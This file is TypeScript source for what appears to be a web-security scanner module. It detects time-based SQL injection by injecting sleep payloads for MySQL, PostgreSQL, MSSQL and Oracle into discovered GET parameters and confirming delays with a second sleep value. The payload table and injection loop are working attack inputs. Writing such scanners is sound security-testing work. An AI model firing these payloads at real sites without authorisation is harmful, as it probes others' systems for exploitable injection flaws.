// Time-based SQL injection scanner (web2-vuln-classes SKILL §2).
//
// AGGRESSIVENESS: time-based techniques ONLY. We never exfiltrate data, never
// go out-of-band, never run a destructive statement — the only thing we observe
// is whether an injected modest sleep (3–5s) shows up as response latency.
//
// EPISTEMIC HONESTY is enforced by construction. A single slow response is not
// proof — so a finding is PROVEN/HIGH only when measureTimingDelta flags a delay
// for one injected sleep AND we reproduce it with a DIFFERENT sleep, with the
// observed latency tracking the injected value (a ~5s run meaningfully slower
// than the ~3s run). Anything short of that is a CANDIDATE/MEDIUM with the exact
// reason it did not confirm. Evidence records only measured means/stddev and the
// two injected delays — never any response content, so no data can leak in.
//
// Not sqlmap-exhaustive: a handful of DBMS sleep syntaxes across three injection
// contexts (raw value, string-break with a quote, SQL comment), against a small
// cap of discovered GET params. Best-effort and NEVER throwing — any failure is
// a logged skip or a CANDIDATE, never an abort of the run.

import { probe } from "./http";
import { measureTimingDelta } from "./timingProbe";
import { logLine, recordFinding, type ScanContext } from "./context";
import type { Severity } from "@prisma/client";

// Caps — best-effort sweep, not a fuzz.
const MAX_SQLI_PARAMS = 6;

// The two injected delays used for the reproduce-with-a-second-value rule.
const DELAY_N1 = 3; // seconds — first (screening) sleep
const DELAY_N2 = 5; // seconds — confirmation sleep (must be meaningfully slower)

// The ~5s run must beat the ~3s run by at least this much for the observed
// latency to be judged as "tracking" the 2s difference in injected sleep. 1.5s
// leaves ~0.5s of jitter tolerance below the 2s expected gap.
const REPRO_MIN_GAP_MS = 1500;

interface ParamTarget {
  /** Full URL with the candidate param's value set to the __PAYLOAD__ token. */
  template: string;
  /** The parameter under test (for logging / evidence). */
  param: string;
  /** The URL as discovered (for the finding location). */
  location: string;
}

interface SqlPayload {
  dbms: string;
  context: string; // "raw value" | "string-break" | "SQL comment"
  /** Build the injected value for an N-second sleep. */
  inject: (n: number) => string;
  /** A structurally-similar value that does NOT sleep (baseline). */
  baseline: string;
}

// A compact matrix of time-based payloads. Each DBMS gets a numeric/raw context,
// a single-quote string-break context, and (where it differs) a comment-closed
// variant. Oracle's blind sleep uses DBMS_PIPE.RECEIVE_MESSAGE as the
// subquery-friendly equivalent of DBMS_LOCK.SLEEP (the latter needs a PL/SQL
// block and cannot sit inside a SELECT predicate).
const PAYLOADS: ReadonlyArray<SqlPayload> = [
  // MySQL / MariaDB — SLEEP(N)
  {
    dbms: "MySQL",
    context: "raw value",
    inject: (n) => `1 AND SLEEP(${n})`,
    baseline: "1 AND 2=1",
  },
  {
    dbms: "MySQL",
    context: "string-break (SQL comment)",
    inject: (n) => `1' AND SLEEP(${n})-- -`,
    baseline: "1' AND '1'='2",
  },
  // PostgreSQL — pg_sleep(N) wrapped so it sits in a boolean predicate.
  {
    dbms: "PostgreSQL",
    context: "raw value",
    inject: (n) => `1 AND (SELECT 1000 FROM PG_SLEEP(${n}))>999`,
    baseline: "1 AND 2=1",
  },
  {
    dbms: "PostgreSQL",
    context: "string-break (SQL comment)",
    inject: (n) => `1' AND (SELECT 1000 FROM PG_SLEEP(${n}))>999-- -`,
    baseline: "1' AND '1'='2",
  },
  // MSSQL — WAITFOR DELAY '0:0:N' (stacked after the injection point).
  {
    dbms: "MSSQL",
    context: "raw value (stacked)",
    inject: (n) => `1;WAITFOR DELAY '0:0:${n}'-- -`,
    baseline: "1",
  },
  {
    dbms: "MSSQL",
    context: "string-break (stacked)",
    inject: (n) => `1';WAITFOR DELAY '0:0:${n}'-- -`,
    baseline: "1'-- -",
  },
  // Oracle — DBMS_PIPE.RECEIVE_MESSAGE blocks N seconds and returns a number,
  // so it works inside a predicate (DBMS_LOCK.SLEEP equivalent, no PL/SQL).
  {
    dbms: "Oracle",
    context: "raw value",
    inject: (n) => `1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',${n})=1`,
    baseline: "1 AND 2=1",
  },
  {
    dbms: "Oracle",
    context: "string-break (SQL comment)",
    inject: (n) => `1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',${n})=1-- -`,
    baseline: "1' AND '1'='2",
  },
];

/** Set (or add) `param`'s value on `url`; underscores survive un-encoded. */
function withParam(url: string, param: string, value: string): string {
  const u = new URL(url);
  u.searchParams.set(param, value);
  return u.toString();
}

/**
 * Discover candidate GET query params from the root page: every param on a
 * same-origin link/action URL that already carries a query, plus the `name`
 * attributes of inputs inside GET forms (appended to the form's action). Capped
 * at MAX_SQLI_PARAMS, deduped by origin+path+param.
 */
function discoverTargets(html: string, baseUrl: string, host: string): ParamTarget[] {
  const targets: ParamTarget[] = [];
  const seen = new Set<string>();

  const add = (rawUrl: string, param: string) => {
    if (targets.length >= MAX_SQLI_PARAMS) return;
    let abs: URL;
    try {
      abs = new URL(rawUrl, baseUrl);
    } catch {
      return;
    }
    if (abs.host !== host || !/^https?:$/.test(abs.protocol)) return;
    if (!param) return;
    const key = `${abs.origin}${abs.pathname}?${param}`;
    if (seen.has(key)) return;
    seen.add(key);
    targets.push({
      template: withParam(abs.toString(), param, "__PAYLOAD__"),
      param,
      location: abs.toString(),
    });
  };

  // 1) Same-origin URLs that already carry query params.
  for (const m of html.matchAll(/(?:href|src|action)\s*=\s*["']([^"']+)["']/gi)) {
    let abs: URL;
    try {
      abs = new URL(m[1], baseUrl);
    } catch {
      continue;
    }
    for (const key of abs.searchParams.keys()) add(abs.toString(), key);
    if (targets.length >= MAX_SQLI_PARAMS) return targets;
  }
  for (const m of html.matchAll(/https?:\/\/[^\s"'<>]+/gi)) {
    let abs: URL;
    try {
      abs = new URL(m[0]);
    } catch {
      continue;
    }
    for (const key of abs.searchParams.keys()) add(abs.toString(), key);
    if (targets.length >= MAX_SQLI_PARAMS) return targets;
  }

  // 2) GET-form input names appended to their action (default action = page).
  for (const form of html.matchAll(/<form\b([^>]*)>([\s\S]*?)<\/form>/gi)) {
    const attrs = form[1];
    const method = /\bmethod\s*=\s*["']?\s*(get)\b/i.test(attrs);
    // A form with no method defaults to GET, so treat "not POST" as GET.
    const isPost = /\bmethod\s*=\s*["']?\s*post\b/i.test(attrs);
    if (isPost && !method) continue;
    const actionM = attrs.match(/\baction\s*=\s*["']([^"']*)["']/i);
    const action = actionM?.[1] || baseUrl;
    for (const inp of form[2].matchAll(
      /<(?:input|textarea|select)\b[^>]*\bname\s*=\s*["']([^"']+)["']/gi,
    )) {
      add(action, inp[1]);
      if (targets.length >= MAX_SQLI_PARAMS) return targets;
    }
  }

  return targets;
}

function evidence(
  p: SqlPayload,
  t: ParamTarget,
  r1: { meanDelayMs: number; baselineMeanMs: number; baselineStdDevMs: number },
  r2?: { meanDelayMs: number; baselineMeanMs: number; baselineStdDevMs: number },
): string {
  const fmt = (x: number) => Math.round(x);
  const lines = [
    `param="${t.param}" ${p.dbms} (${p.context})`,
    `inject N=${DELAY_N1}s: mean=${fmt(r1.meanDelayMs)}ms baseline=${fmt(r1.baselineMeanMs)}ms (σ=${fmt(r1.baselineStdDevMs)}ms)`,
  ];
  if (r2) {
    lines.push(
      `inject N=${DELAY_N2}s: mean=${fmt(r2.meanDelayMs)}ms baseline=${fmt(r2.baselineMeanMs)}ms (σ=${fmt(r2.baselineStdDevMs)}ms)`,
      `delta between the two injected delays: ${fmt(r2.meanDelayMs - r1.meanDelayMs)}ms (expected ~${(DELAY_N2 - DELAY_N1) * 1000}ms)`,
    );
  }
  lines.push("(no response content recorded — time-based signal only)");
  return lines.join("\n");
}

export async function runSqli(ctx: ScanContext): Promise<void> {
  await logLine(ctx.scanRunId, `[sqli] time-based scan of ${ctx.baseUrl}`);

  let host: string;
  try {
    host = new URL(ctx.baseUrl).host;
  } catch {
    await logLine(ctx.scanRunId, `[sqli] bad baseUrl, skipping`, "STDERR");
    return;
  }

  const root = await probe(ctx.baseUrl, { timeoutMs: 10_000 });
  if (root.error) {
    await logLine(
      ctx.scanRunId,
      `[sqli] could not fetch ${ctx.baseUrl}: ${root.error} — skipping`,
      "STDERR",
    );
    return;
  }

  const targets = discoverTargets(root.body, ctx.baseUrl, host);
  if (targets.length === 0) {
    await logLine(ctx.scanRunId, `[sqli] no GET query params discovered — nothing to test`);
    return;
  }
  await logLine(
    ctx.scanRunId,
    `[sqli] testing ${targets.length} param(s) with ${PAYLOADS.length} time-based payload(s) each`,
  );

  for (const t of targets) {
    let confirmed = false;
    // The best near-miss for this param, reported as a CANDIDATE if nothing
    // confirms (keeps the most informative reason rather than the last one).
    let candidate: { payload: SqlPayload; reason: string; evidence: string } | null = null;

    for (const p of PAYLOADS) {
      if (confirmed) break;
      try {
        // Screening run at N1 seconds.
        const r1 = await measureTimingDelta(
          t.template,
          p.inject(DELAY_N1),
          p.baseline,
        );
        if (!r1.delayObserved) {
          if (!candidate) {
            candidate = {
              payload: p,
              reason: "no delay beyond baseline variance",
              evidence: evidence(p, t, r1),
            };
          }
          continue;
        }

        // Reproduce with a DIFFERENT, larger delay. The observed latency must
        // track the injected value, else the first delay was noise.
        const r2 = await measureTimingDelta(
          t.template,
          p.inject(DELAY_N2),
          p.baseline,
        );
        const gap = r2.meanDelayMs - r1.meanDelayMs;
        const tracks = r2.delayObserved && gap >= REPRO_MIN_GAP_MS;

        if (tracks) {
          confirmed = true;
          await recordFinding(ctx, {
            title: `Time-based SQL injection — param "${t.param}" (${p.dbms})`,
            vulnClass: "SQL Injection",
            severity: "HIGH" as Severity,
            confidence: "PROVEN",
            location: t.location,
            description:
              `A ${p.dbms} time-based payload injected into "${t.param}" ` +
              `(${p.context}) produced a server delay that reproduced with a ` +
              `second, larger sleep: the ~${DELAY_N1}s payload and the ` +
              `~${DELAY_N2}s payload both cleared baseline variance, and the ` +
              `observed latency tracked the injected delay (${Math.round(gap)}ms ` +
              `slower for +${DELAY_N2 - DELAY_N1}s injected). This is a ` +
              `reproducible time-based signal, not a single slow sample.\n\n` +
              `Confirm manually with a boolean/UNION proof before reporting if ` +
              `the program requires it; impact assumed is blind SQLi (read).`,
            evidence: evidence(p, t, r1, r2),
          });
          await logLine(
            ctx.scanRunId,
            `[sqli] PROVEN time-based SQLi on "${t.param}" (${p.dbms}, ${p.context})`,
          );
        } else {
          const reason = !r2.delayObserved
            ? "delay not reproducible with a second value (second sleep did not clear baseline variance)"
            : `delay did not track the injected value (gap ${Math.round(gap)}ms < ${REPRO_MIN_GAP_MS}ms)`;
          // A near-miss is the strongest candidate — overwrite any weaker one.
          candidate = { payload: p, reason, evidence: evidence(p, t, r1, r2) };
        }
      } catch (err) {
        // Must never throw: log and move to the next payload.
        await logLine(
          ctx.scanRunId,
          `[sqli] payload errored on "${t.param}" (${p.dbms}): ${err instanceof Error ? err.message : String(err)} — skipping`,
          "STDERR",
        );
      }
    }

    if (!confirmed && candidate) {
      await recordFinding(ctx, {
        title: `Possible time-based SQLi candidate — param "${t.param}"`,
        vulnClass: "SQL Injection",
        severity: "MEDIUM" as Severity,
        confidence: "CANDIDATE",
        location: t.location,
        description:
          `Parameter "${t.param}" was probed with time-based ${candidate.payload.dbms} ` +
          `payloads (${candidate.payload.context}) but did NOT confirm: ` +
          `${candidate.reason}. Recorded as a candidate for manual review — a ` +
          `reproducible delay across two different injected sleeps was not ` +
          `observed, so this is not proof of injection.`,
        evidence: candidate.evidence,
      });
    }
  }

  await logLine(ctx.scanRunId, `[sqli] done`);
}
